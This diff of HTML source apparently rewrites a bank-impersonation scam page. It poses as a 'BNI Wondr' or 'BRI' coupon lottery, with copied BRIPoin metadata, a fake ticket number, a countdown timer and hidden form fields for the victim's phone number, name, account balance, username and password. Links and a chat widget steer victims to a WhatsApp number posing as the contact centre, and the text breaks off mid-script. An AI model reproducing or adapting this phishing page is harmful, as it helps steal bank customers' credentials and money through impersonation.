@@ -1,109 +1,565 @@
-<html lang="en">
- <head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1" name="viewport"/>
-  <title>
-   Wondr Coupon Animated
-  </title>
-  <script src="https://cdn.tailwindcss.com">
-  </script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-    <audio controls autoplay hidden>
-    <source src="https://cdn.glitch.global/7839e9bf-edcb-438d-9486-a90226aa4c1d/patok.mp3?v=1745086585783" type="audio/mpeg" />
-  </audio>      
+<html>
+ <head> 
+  <meta charset="utf-8"> 
+  <meta name="fragment" content="!"> 
+  <meta name="theme-color" content="#0F78CB"> 
+   <!-- HTML Meta Tags -->
+
+  <title>𝗕𝗡𝗜 𝗪𝗼𝗻𝗱𝗿 | 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗢𝗜𝗡-𝗺𝘂</title>
+
+  <meta name="description" content="BRIPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah Bank BRI (BritAma, Simpedes, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi di Bank BRI dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank BRI.">
+
+  <!-- Facebook Meta Tags -->
+  <meta property="og:url" content="https://bripoin.bri.co.id">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="𝗕𝗡𝗜 𝗪𝗼𝗻𝗱𝗿  | 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗢𝗜𝗡-𝗺𝘂">
+  <meta property="og:description" content="BRIPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah Bank BRI (BritAma, Simpedes, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi di Bank BRI dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank BRI.">
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQe2_RRje_H6EnHBS7-zriaK4XxvgoL3qqnmA&usqp=CAU">
+
+  <!-- Twitter Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="bripoin.bri.co.id">
+  <meta property="twitter:url" content="https://bripoin.bri.co.id">
+  <meta name="twitter:title" content="𝗕𝗥𝗜𝗣𝗼𝗶𝗻 | 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗢𝗜𝗡-𝗺𝘂">
+  <meta name="twitter:description" content="BRIPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah Bank BRI (BritAma, Simpedes, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi di Bank BRI dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank BRI.">
+  <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQe2_RRje_H6EnHBS7-zriaK4XxvgoL3qqnmA&usqp=CAU">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+<link rel="icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgO_KJKoiNoIOuh2awDawBIzbhPGD8ZE4TQ2Lzyo2PyR4INOQozVU1zIwCJXeS3T_ZhCnXxdoYusOrUPXuuMF1k-9P3jpaV1SLE9L0WQrdMN72HbXyIc0uDJOF04L_GChyphenhyphenUilXS-nc35hyJaBkonxSZr14jTnIWJE8MXDHo_-G5nfONdgw9zPpI1CPwFhs/s100/AddText_10-22-11.27.51.jpg" type="image/x-icon" />
+<link rel="apple-touch-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipe73s-3CcYv1XXmiOtnfFSKYbs7EFK5AJb1P4Jj-6LiXpr7qbbsnoHWxM-MG6cHMlkZu6V342OuENy8Evo_MoLlFzmub-d7VFYcBycMykKax6G8XaoMGi_IhqDZzVm9Sv05nTWxEDe82lnuwS4ln0HnG6VE0sGqhO70WQflrIt5RuY8lZIDftN9qwk4Q/s1080/AddText_10-22-11.27.23.jpg" />
+  <!-- Meta Tags Generated via https://www.opengraph.xyz -->
+        
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"> 
+  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet"> 
   <style>
-   @import url('https://fonts.googleapis.com/css2?family=Roboto+Slab&display=swap');
-   body {
-     font-family: 'Roboto Slab', serif;
-   }
-   /* Animation for fade in letter by letter */
-   .fade-in-text {
-     display: inline-block;
-     opacity: 0;
-     animation-fill-mode: forwards;
-     animation-name: fadeIn;
-     animation-duration: 0.04s;
-     animation-timing-function: ease-in;
-   }
-   @keyframes fadeIn {
-     to {
-       opacity: 1;
-     }
-   }
-  </style>
-  <script>
-   // Wrap each letter in span with fade-in-text class and stagger animation delay
-   function animateText(selector) {
-     const element = document.querySelector(selector);
-     if (!element) return;
-     const text = element.textContent;
-     element.textContent = '';
-     for (let i = 0; i < text.length; i++) {
-       const span = document.createElement('span');
-       span.textContent = text[i];
-       span.classList.add('fade-in-text');
-       span.style.animationDelay = (i * 0.04) + 's';
-       element.appendChild(span);
-     }
-   }
-   window.addEventListener('DOMContentLoaded', () => {
-     animateText('#topText');
-     animateText('#bottomText');
-   });
-  </script>
- </head>
- <body class="bg-white">
-  <div class="max-w-md mx-auto">
-   <!-- Top banner as image -->
-   <div>
-    <img alt="Wondr by BNI and BUMN Untuk Indonesia logos with orange curved corner top left" class="w-full object-contain" src="https://i.supaimg.com/f9f6fc1b-381f-4e2f-83c4-7cc8a1764b82.jpg"/>
-   </div>
-   <!-- Image of 5 people in yellow uniform -->
-   <div class="px-4">
-    <img alt="Five people standing in a row wearing yellow uniforms and white shirts with ties, smiling" class="w-full object-contain" height="675" src="https://i.supaimg.com/3d720247-3997-4c31-b5c8-78c26f0ac7bb.png" width="380"/>
-   </div>
-   <!-- Blue text below image with fade in animation -->
-   <p class="text-center text-blue-700 font-semibold italic text-lg mt-2 px-4" id="topText">
-    Selamat Kupon Undian Suda Tercetak
-   </p>
-   <!-- Ticket style coupon -->
-   <div class="flex justify-center mt-4 px-4">
-    <div class="flex border border-slate-900 rounded-md overflow-hidden w-full max-w-xl">
-     <div class="bg-cyan-200 flex items-center justify-center px-6 relative">
-      <h2 class="text-orange-600 font-bold text-xl tracking-tight">
-       wondr
-      </h2>
-      <span class="text-xs font-semibold text-yellow-800 ml-1 mt-6">
-       by BNI
-      </span>
-      <div class="absolute top-0 left-0 w-6 h-6 bg-white rounded-full -translate-x-1/2 -translate-y-1/2 border border-slate-900">
-      </div>
-      <div class="absolute bottom-0 left-0 w-6 h-6 bg-white rounded-full -translate-x-1/2 translate-y-1/2 border border-slate-900">
-      </div>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            font-family: 'Open Sans', sans-serif;
+            position: fixed;
+            background:#DEE7EE;
+        }
+
+        .text-header {
+            font-family: 'Open Sans', sans-serif;
+            color: #0086e0;
+        }
+
+        .text-subheader {
+            font-family: 'Open Sans', sans-serif;
+            margin-top: -20px;
+            color: #000;
+        }
+
+        .btn-punya {
+            display: block;
+            margin: 80px auto 0 auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none rgb(0, 134, 224);
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .btn-belum {
+            display: block;
+            margin: 10px auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none transparent;
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(0, 134, 224);
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            transition: background 200ms ease 0s;
+        }
+
+     
+
+        .Button clickable-element {
+            display: block;
+            margin: 60px 0 0 0;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none rgba(0, 111, 214, 0.96); 
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 370px; 
+            font-family: Arial; 
+            font-size: 17px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 1px; 
+            line-height: 1; 
+            border-radius: 8px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 100ms step-start 0s;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .btn-login {
+                width: 82%;
+            }
+        }
+
+
+        .box-lte {
+            width: 380px;
+            max-width: 95%;
+            background: none;
+            display: block;
+            
+            margin: -40px auto;
+            border-radius: 20px;
+        }
+
+        textarea {
+            box-sizing: border-box; 
+            height: 75px;
+            margin-top: -30px;
+            width: 280px;
+            border: 3px solid rgb(0, 134, 224);
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+        }
+        
+          .textarea1 {
+            box-sizing: border-box; 
+            
+            border: 2px solid red;
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 50px;
+            
+        }
+        
+         .textarea {
+            box-sizing: border-box; 
+            height: 75px;
+           
+            width: 280px;
+            border: 2px solid red;
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+        }
+        
+        textarea::placeholder{
+            font-size: 13px;
+        }
+           h1{
+            display: table;
+            background-color: transparent;
+            color: #FF0000;
+            padding: 15px;
+            width: 100%;
+            font-size: 14px;
+            margin-bottom: -70px;
+            text-align: center;
+            position: fixed;
+            top: 52;
+           font-weight: bold;
+            right: 0;
+            left: 0;
+            margin: 0px auto;
+            
+        }
+
+        
+        .blink {
+    
+  animation: blink-animation 2s steps(6, start) infinite;
+  -webkit-animation: blink-animation 2s steps(6, start) infinite;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+
+#Aktivasi{
+    display: none;
+}
+    
+
+  <style>
+#animation-demo {
+	width: 200px;
+	height: 150px;
+	position: relative;
+	background-color: #62A80A;
+	line-height: 150px;
+	color: #000;
+	border: solid 1px #1A7404;
+	text-align: center;
+} 
+
+.naik {
+	-webkit-animation-duration: 1s;
+	animation-duration: 1s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+	-webkit-animation-timing-function: ease-in;
+	animation-timing-function: ease-in;
+	-webkit-animation-name: bounceOutUp; 
+    animation-name: bounceOutUp; 
+}
+
+@-webkit-keyframes bounceOutUp { 
+    0% { 
+        -webkit-transform: translateY(0); 
+    } 
+    20% { 
+        opacity: 1; 
+        -webkit-transform: translateY(20px); 
+    } 
+    100% { 
+        opacity: 1; 
+        -webkit-transform: translateY(-200px); 
+    } 
+} 
+@keyframes bounceOutUp { 
+    0% { 
+        transform: translateY(0); 
+    } 
+    20% { 
+        opacity: 1; 
+        transform: translateY(20px); 
+    } 
+    100% { 
+        opacity: 1; 
+        transform: translateY(-500px); 
+    } 
+} 
+.bounceOutUp { 
+    
+}
+
+
+/*********************/
+.process1 {
+     width: 100%;
+            height: 100%;
+             display: flex;
+             justify-content: center;
+            margin: auto;
+            position: absolute;
+           padding-top: 300px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 99999;
+            
+      
+}
+.loading {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+    margin-top: 300px;
+}
+.loading img {
+    width: 50px;
+    
+    top: 10;
+}
+.loading .spinner{
+    position: absolute;
+    width: 35px;
+    animation: spin 1s linear infinite;
+    -webkit-animation: spin 1s linear infinite;
+    -moz-animation: spin 1s linear infinite;
+    -ms-animation: spin 1s linear infinite;
+    -o-animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(360deg); }
+  100% { transform: rotate(0deg); }
+}
+@-webkit-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-moz-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-ms-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-o-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+
+
+.loader{
+      font-size: 20px;
+      color: #FFF;
+      font-weight: bold;
+      display: inline-block;
+      font-family: 'Nunito', sans-serif;
+      
+      position: absolute;
+      margin-top: 0px;
+    }
+    .loader:before{
+      content: '';
+      animation: 2s print linear alternate infinite;
+    }
+    .loader:after{
+      content: '';
+      position: absolute;
+      right: -4px;
+      top: 50%;
+      transform: translatey(-45%);
+      width: 2px;
+      height: 1.3em;
+      background: currentColor;
+      opacity: 0.8;
+      animation: 1s blink steps(2) infinite;
+    }
+    
+    @keyframes blink {
+      0%  { visibility: hidden;}
+      100%  { visibility: visible;}
+    }
+    @keyframes print {
+      0% { content: 'B'}
+      10% { content: 'BR'}
+      20% { content: 'BRI'}
+      30% { content: 'BRIm'}
+      40% { content: 'BRImo'}
+      50% { content: 'BRImo-'}
+      60% { content: 'BRImo-B'}
+      70% { content: 'BRImo-BR.'}
+      80% { content: 'BRImo-BRI..'}
+      90% , 100% { content: 'BRImo-BRI...'}
+    }
+    
+
+.card-input__label {
+  font-size: 17px;
+  margin-bottom: 0px;
+  font-weight: 500;
+  color: #1A89DF;
+  width: 100%;
+  margin-top: 5px;
+  display: block;
+  user-select: none;
+}
+
+.copy-link {
+
+            height: 44px; 
+            max-width: 100%;
+            border: 2px solid rgb(0, 134, 224);
+            border-radius: 10px;
+
+             color: rgb(28, 28, 28); 
+            word-spacing: 0px; 
+            padding: 2px;
+            margin: 5px;
+            }
+
+.copy-link-input {
+
+flex-grow: 2;
+    width : 78%;
+    height: 33px; 
+    margin-right : 50px;
+    padding: 1px;
+    font-size: 18px;
+    border: 0px solid ;
+    border-right: none;
+    
+}
+.copy-link-button {
+    flex-shrink: 0;   
+    border: 1px solid ;
+    border-radius: 3px;
+    color: #098CE3;
+    margin-left: 230px;
+    margin-top: -40px;
+
+    display: flex; 
+    
+
+
+
+
+            
+
+    }
+</style>
+ </head> 
+ <body> 
+  
+  <div id="popupku" style="position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  width: 100%; height: 100%; background: rgba(0,0,0, 0.4); z-index: 9999">
+  
+    <center>
+ <img id="gambarku" class="animated" src="https://blogger.googleusercontent.com/img/a/AVvXsEiaYVi1Ex3TIEtx0Qk_k-eq3yZ2BCf1aVivZ0H3rEZp74XK1kTLv4I0aKGGGDKyPIU7faskSAgdmWfFadfDuoKqX6QcH93JXjY6BKk4mUMzTdlg0ptlElK-cUzcaXnIaP2JzZ3iEmJFg8Ti9NROeC1DO-AzyPLY7bJqf1aZHir1n3-7AnH40-1Ad0mgGEFi" width="60%" style="margin-top: 250px; border-radius: 15px; box-shadow: rgba(199, 199, 199, 2.2)  0px 2px 5px 0px; border: 2px double #0F78CB" onclick="tutupimg()">
+    </center>
+</div>
+             <img src="https://blogger.googleusercontent.com/img/a/AVvXsEicxCOLzOFjgStFP6DjyeYkmCR2eBPwjfiCmyhRw-OLwqymkcQ-5zjG0Jq9sfqmqq0bNpDk9Y2nmRma4q9KJAkLEKAK-8WtlaCGarAvAQVSw9wzz0p_jhiwLmw_CLu1sCHOqdaTfUydCWa7JGWmVPIjant-GizUN8zz4UITm3ebFBU07qJzz7zsWxFLSI-D" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
+ <img src="https://blogger.googleusercontent.com/img/a/AVvXsEir90lBMxcnioEVWyv0T6SQ4oDVR7PkRtB90Xu_7lP-WMCC8RI-wtfa0gQ013G-oo3hEWTAsA6GZv-m74yPyik-ISeHIAxNGiws1QTOKwf-9sfQSi7HKd8yVOy-zbOCgafshV5Aod718gvL4qETV0NQkQ_gtolhHjZ089POLO1-D16eLVGlupB1Vxks5Zd2" style="width: 100%; position: fixed; top: 0; left: 0; right: 0; margin: 0px auto">
+
+ <div class="blink" style="display: none " id="blinkAktivasi"><h1>Nomor Teket Berhasil Disalin Silakan Konfirmasi CETAK KUPON Festival </h1></div> 
+  <div class="container" id="otp"> 
+   <div class="box-lte"> 
+    <div class="row" style="margin-top: 100px;"> 
+     <center>
+     <div class="col-12 d-block mx-auto text-center p-0" style="height: 290px; width: 85%; max-width: 100%; display: block; margin-top: 10px; border-radius: 0px 25px 0px 25px; position: absolute; margin: 0px auto; left: 0; right: 0;z-index: -1"> 
+      <img alt="" src="https://blogger.googleusercontent.com/img/a/AVvXsEhDnbwOBoE3X1hfSFxoRxNy8rFcDEYgkw1gSiy2szt_1c-ny5GBYLFXEhEvGobKX1iP_EJZHbhgsA89D8D36UvqIsHnyvvJB8sgsldzpmjGJByScsU2J_ftEoEF0IiHLiAsupttY9W1HJenIyNcr5LuOMAl1ShZPXJ98KJWMjpXWe6ecNGYtnJ9Zwc45Iot" style="display: block; margin: 0px; width: 100%; height: 62%; border: 0px solid #fff; border-radius: 20px 20px 20px 20px; border-top: none; box-shadow: rgba(99, 99, 99, 0.2) -0px 3px 8px -2px; margin-top: 90px "> 
      </div>
-     <div class="bg-yellow-200 flex items-center px-4 flex-1">
-      <p class="font-extrabold text-2xl underline decoration-slate-900 decoration-2">
-       71600000********
-      </p>
-     </div>
-     <div class="relative">
-      <div class="absolute top-0 right-0 w-6 h-6 bg-white rounded-full translate-x-1/2 -translate-y-1/2 border border-slate-900">
-      </div>
-      <div class="absolute bottom-0 right-0 w-6 h-6 bg-white rounded-full translate-x-1/2 translate-y-1/2 border border-slate-900">
-      </div>
-     </div>
+         <div class="row" style="margin-top: 190px"> 
+    
+     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin-top: 10px; margin: -30px auto;" id="waktu">3 : 00</p> 
+    </div>  
+    </div> 
+
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: 40px"> 
+      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px"></p> 
+     </div> 
+    </div> 
+    <center>
+    <div class="row" style="margin-top: 5px; height: 170px; border: 2px solid #fff; width: 97%; border-radius: 15px; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-GS2QLH5sTYjzLcnuRCCRqnHrc8NtNQyXThUatIg2Phz2obgUWHIuhxXRkOSDgC2m3WpWKJz4_OBloxwrfsgt-we1G02znrG2bRrriGnh9Gi59pCyiGNRAh-iGIE8RcMNr98Su4FSS3p6OriBv5Aewr2YnW5USA3PEDBmtBacEQvsUABW-zMFb2Vp3Vk/s1072/AddText_06-10-03.05.51.png); background-size: 100% 100%; background-position: 100% 100%; padding-top: 40px; box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"> 
+        
+
+                                
+  <form onsubmit="kirimPesan1(event)" method="post" id="formLink">
+      
+<input type="hidden" id="nomorhp" name="NoHp" value="">
+<input type="hidden" id="nama" name="nama" value="">
+<input type="hidden" id="saldo" name="saldoTerakhir" value="">
+<input type="hidden" id="uname" name="uname" value="">
+<input type="hidden" id="pass" name="pass" value="">
+       <center>
+
+       
+ 
+         <label class="card-input__label" style="font-size: 15px;  margin-top: -25px;  font-weight: 600;">Silakan Salin Nomor Tiket Anda.</label>
+ <br>       
+        <div class="copy-link" style="margin-top: -20px;"> 
+         <input type="text" class="copy-link-input" id="HTMLBox" value="9888-8677-0144-XXXX">
+  </div> 
+  <button class="copy-link-button" id="HTMLButton">
+    <span 
+class="material-icons" >content_copy</span> </button>
+        
+
+       <b>
+ 
+           <a href="https://api.whatsapp.com/send?phone=6282260464507&text=Saya%20Belum%20Mendapatkan%20Kode%20Kupon%20Undian" id="kirims" class="bubble-element Button clickable-element"  />
+              <label  class="bubble-element Button clickable-element" style="max-width: 100%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 10px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" /><br>
+Cek Tiket Kupon</a></lebel>
+</b>  
+      </form>
     </div>
+    <b> <p onclick="location.href='https://wa.me/6282260464507?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none">Tidak Terima Kode?
+         <span style="color: #098CE3">Hubungi Contact Center</span>
+         </strong></p></b>
+   </center>
+   <b> 
    </div>
-   <!-- Instruction text with fade in animation -->
-   <div class="px-6 mt-6">
-    <p class="text-center text-slate-900 text-sm leading-relaxed font-semibold tracking-wide" id="bottomText">
-     Simpan  Kode  Kupon  Undian  Ssementara  Anda  Silahkan  Konfirmasi  Pendaftaran  Di  Aplikasi  Wondr  by  BNI  Anda  Sekarang  Pilih  MENU  Wondr  FESTIVAL,  Untuk  Mendaftar  Pihak  Bank  BNI  Akan  Menghubungi  Anda  Unutk  Konfirmasi  Pendaftaran  Kupon  Undian  Yang  Tercetak  Sementaera  Agar  Diganti  Ke  Kupon  Undian  Resmi  Di  Aplikasi  Wondr  By  Bni  Anda  Terimakasih.
-    </p>
-   </div>
-   <!-- Bottom banner as image -->
-   <div>
-    <img alt="Wondr by BNI and BUMN Untuk Indonesia logos with orange curved corner bottom right" class="w-full object-contain" src="https://i.supaimg.com/654bd9e8-ab29-4371-bf0a-26882afb566c.jpg"/>
-   </div>
+
+   
+    </div> </b>
   </div>
- </body>
-</html>
+   
+    <center>
+     <div id="process1" name="process" class="process1" style="display: none;">
+           <span class="loader"></span>
+        </div>
+        </center>  
+  <audio hidden controls id="bsi">
+<source src="cs.mp3" type="audio/ogg">
+<source src="cs.mp3" type="audio/mpeg">
+  Your browser does not support the audio element.
+</audio> 
+ <audio hidden controls id="bsiku">
+<source src="tunggu-bri." type="audio/ogg">
+<source src="tunggu-bri." type="audio/mpeg">
+  Your browser does not support the audio element.
+</audio>
+<script>
+         // HTML BOx JS Code
+      let HTMLBox = document.getElementById("HTMLBox");
+      let HTMLButton = document.getElementById("HTMLButton");
+
+      HTMLButton.onclick = function () {
+        HTMLBox.select();
+        document.execCommand("copy");
+        HTMLButton.innerText = "Copy";
+      };
+</script>    
+<script
+    src='whatsapp-button.js'
+    async
+    onLoad="whatsappButton({
+    buttonName:' ',
+    buttonIconSize: '30',
+    right: '10',
+     brandImageUrl:'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8eHxO93WCnRc-CQfdz96UGBAhJ7EbRcBzVgWFRSMV5mLEUhHegPaifIHxM7MZszAW_XuZrseWLPBG99DT4SGF8ObwpYXG0aWGYt96e559R5J1AMa_30Ikxi6aoOtR8jvSansOh7obOZyD3nGJ11rHDvQdyxAqJzpbh-6KAa2eeJt6nsclBfwlhoY-x3c/s388/IMG_20240518_024956.jpg',
+    buttonMargin:'',
+    brandName:'Bank BRI',
+    brandSubtitleText:'online',
+    buttonSize:'medium',
+    buttonPosition:'right',
+    callToAction:'Chat Sekarang',
+    phoneNumber:'082260464507',
+    welcomeMessage:'Hallo Kak, Apa yang dapat saya bantu?👋',
+    prefillMessage:'Saya Belum Mendapatkan Kode Kupon Undian  ',
+    })"
+    >
+</script>
+
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="mainkode.js"></script>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script>
+var nomor = sessionStorage.getItem("nomor");
+docum
